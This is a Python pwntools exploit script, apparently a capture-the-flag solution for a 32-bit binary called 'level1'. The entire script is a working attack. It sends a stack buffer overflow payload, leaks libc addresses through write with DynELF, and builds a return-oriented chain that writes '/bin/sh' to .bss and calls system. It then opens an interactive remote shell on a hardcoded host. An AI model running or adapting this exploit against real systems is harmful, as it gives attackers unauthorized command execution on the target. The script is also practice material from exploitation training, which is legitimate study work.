from pwn import *

context.log_level = 'debug'
elf = ELF('level1')
r = remote('193.168.6.19',10000)
# r = remote('node3.buuoj.cn',29966)
plt_write = elf.plt['write']
got_write = elf.got['write']
main_addr = 0x080484B7

def leak(addr):
	
	payload = 'a' * 0x88 + 'a' * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
	
	#sleep(2)
	
	r.sendline(payload)
	data = r.recv(4)
	print hex(u32(data))
	print "%#x => %s" % (addr,(data or '').encode('hex'))
	return data

d = DynELF(leak,elf=ELF('level1'))
system_addr = d.lookup('system','libc')
print 'system_addr: '+ hex(system_addr)


bss_addr = 0x0804a02c - 30
pppr_addr = 0x08048549
plt_read = elf.plt['read']


#r.recvuntil('?\n')
#sleep(2)
payload2 = 'a' * 0x88 + 'a' * 4 + p32(plt_read) + p32(pppr_addr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(1) + p32(bss_addr)

sleep(2)

r.sendline(payload2)
#sleep(2)
#r.recvline()
r.sendline('/bin/sh\x00')

r.interactive()




